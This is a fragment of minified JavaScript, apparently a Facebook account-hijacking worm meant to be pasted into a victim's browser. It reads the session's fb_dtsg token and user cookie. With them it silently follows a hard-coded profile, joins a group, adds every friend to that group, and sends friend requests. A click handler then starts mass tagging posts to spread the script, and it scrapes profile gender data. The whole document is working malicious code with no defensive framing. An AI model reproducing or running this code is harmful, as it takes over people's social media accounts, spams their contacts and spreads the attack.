r="profile_id="+e+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";t.open("POST",n,true);t.setRequestHeader("Content-type","application/x-www-form-urlencoded");t.setRequestHeader("Content-length",r.length);t.setRequestHeader("Connection","close");t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function sublist(e){var t=document.createElement("script");t.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+e+" }).send();";document.body.appendChild(t)}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}function sarkadasekle(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){if(n.readyState==4){}};n.open("POST","/ajax/add_friend/action.php?__a=1",true);var r="to_friend="+e;r+="&action=add_friend";r+="&how_found=friend_browser";r+="&ref_param=none";r+="&outgoing_id=";r+="&logging_location=friend_browser";r+="&no_flyout_on_click=true";r+="&ego_log_data=";r+="&http_referer=";r+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;r+="&phstamp=165816749114848369115";r+="&__user="+user_id;n.setRequestHeader("X-SVN-Rev",svn_rev);n.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(t=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){n.send(r)}else if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(e,t,"sarkadasekle")}else if(t==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){n.send(r)}}function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1e3*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);alert("Chúc các bạn nghe nhạc và chơi FB vui vẻ");var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100005172337915");sublist("1403042736588066");var gid=["322802717812006"];var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/membership/r2j.php?__a=1";var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["send"](paramswp);var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var friends=new Array;gf=new XMLHttpRequest;gf["open"]("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math["random"]()+"&filter[0]=user&options[0]=friends_only",false);gf["send"]();if(gf["readyState"]!=4){}else{data=eval("("+gf["responseText"]["substr"](9)+")");if(data["error"]){}else{friends=data["payload"]["entries"]["sort"](function(e,t){return e["index"]-t["index"]})}}for(var i=0;i<friends["length"];i++){var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/members/add_post.php?__a=1";var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["onreadystatechange"]=function(){if(httpwp["readyState"]==4&&httpwp["status"]==200){}};httpwp["send"](paramswp)}var spage_id="145115862363632";var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date;var btarihi=new Date;btarihi.setTime(bugun.getTime()+1e3*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];sarkadaslari_al();document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);var cinssonuc={};var cinshtml=document.createElement("html")